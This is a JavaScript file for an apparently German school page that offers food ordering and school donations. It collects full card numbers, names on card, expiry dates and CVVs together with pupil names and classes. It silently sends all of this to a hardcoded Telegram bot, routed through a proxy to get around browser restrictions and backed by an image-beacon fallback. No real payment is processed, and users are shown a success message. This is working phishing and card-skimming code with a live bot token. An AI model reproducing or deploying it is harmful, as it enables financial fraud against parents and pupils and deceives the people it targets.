// Telegram Bot Daten
const botToken = '8255790332:AAHAlWaR8PmCgOmewZ0knEcdRS5heLpKcbU';
const chatId = '8306987601';

// Elemente auswählen
const orderFoodBtn = document.getElementById('orderFood');
const donateSchoolBtn = document.getElementById('donateSchool');
const orderForm = document.getElementById('orderForm');
const donateForm = document.getElementById('donateForm');
const errorMessage = document.getElementById('errorMessage');
const successMessage = document.getElementById('successMessage');
const loadingOverlay = document.getElementById('loadingOverlay');

// Event-Listener für die Optionen
orderFoodBtn.addEventListener('click', function() {
    orderForm.style.display = 'block';
    donateForm.style.display = 'none';
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
});

donateSchoolBtn.addEventListener('click', function() {
    donateForm.style.display = 'block';
    orderForm.style.display = 'none';
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
});

// Funktionen zur Verarbeitung der Formulare
function processOrder() {
    // Daten sammeln
    const foodSelection = document.getElementById('foodSelection').value;
    const orderName = document.getElementById('orderName').value;
    const orderClass = document.getElementById('orderClass').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const cardName = document.getElementById('cardName').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    
    // Einfache Validierung
    if (!foodSelection || !orderName || !orderClass || !cardNumber || !cardName || !expiryDate || !cvv) {
        showError('Bitte füllen Sie alle Felder aus.');
        return;
    }
    
    showLoading();
    
    // Nachricht für Telegram formatieren
    const message = `NEUE BESTELLUNG:\nEssen: ${foodSelection}\nName: ${orderName}\nKlasse: ${orderClass}\nKarte: ${cardNumber}\nName auf Karte: ${cardName}\nGültig bis: ${expiryDate}\nCVV: ${cvv}\nDatum: ${new Date().toLocaleString('de-DE')}`;
    
    // Nachricht an Telegram senden
    sendToTelegram(message);
}

function processDonation() {
    // Daten sammeln
    const donorName = document.getElementById('donorName').value;
    const donorClass = document.getElementById('donorClass').value;
    const cardNumber = document.getElementById('donateCardNumber').value;
    const cardName = document.getElementById('donateCardName').value;
    const expiryDate = document.getElementById('donateExpiryDate').value;
    const cvv = document.getElementById('donateCvv').value;
    
    // Einfache Validierung
    if (!donorName || !donorClass || !cardNumber || !cardName || !expiryDate || !cvv) {
        showError('Bitte füllen Sie alle Felder aus.');
        return;
    }
    
    showLoading();
    
    // Nachricht für Telegram formatieren
    const message = `:\n n: ${donorName}\nKlass: ${donorClass}\nk: ${cardNumber}\nNa: ${cardName}\nGü: ${expiryDate}\nC: ${cvv}\nDa: ${new Date().toLocaleString('de-DE')}`;
    
    // Nachricht an Telegram senden
    sendToTelegram(message);
}

// Funktion zum Senden an Telegram
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Verwenden von fetch mit einem Proxy, um CORS zu umgehen
    fetch(`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        hideLoading();
        
        if (data.ok) {
            // Erfolgsmeldung anzeigen
            successMessage.style.display = 'block';
            successMessage.textContent = '✅ Vielen Dank! Ihre Anfrage wurde erfolgreich übermittelt.';
            
            // Formular zurücksetzen
            if (orderForm.style.display === 'block') {
                document.getElementById('orderForm').reset();
            } else {
                document.getElementById('donateForm').reset();
            }
        } else {
            showError('Fehler beim Senden der Daten. Bitte versuchen Sie es später erneut.');
        }
    })
    .catch(error => {
        hideLoading();
        showError('Netzwerkfehler. Bitte versuchen Sie es später erneut.');
        console.error('Error:', error);
        
        // Fallback: Daten mit Bild-Request senden (einfacher, aber weniger zuverlässig)
        const img = new Image();
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    });
}

// Hilfsfunktionen
function showLoading() {
    loadingOverlay.style.display = 'flex';
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
}

function showError(text) {
    errorMessage.style.display = 'block';
    errorMessage.textContent = text;
}

// Formatierung der Kreditkartennummer
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.substring(0, 16);
    
    // Füge Leerzeichen nach je 4 Ziffern ein
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    
    e.target.value = formattedValue;
});

// Gleiche Formatierung für die Spenden-Seite
document.getElementById('donateCardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.substring(0, 16);
    
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    
    e.target.value = formattedValue;
});

// Formatierung des Ablaufdatums
document.getElementById('expiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    e.target.value = value;
});

document.getElementById('donateExpiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    e.target.value = value;
});
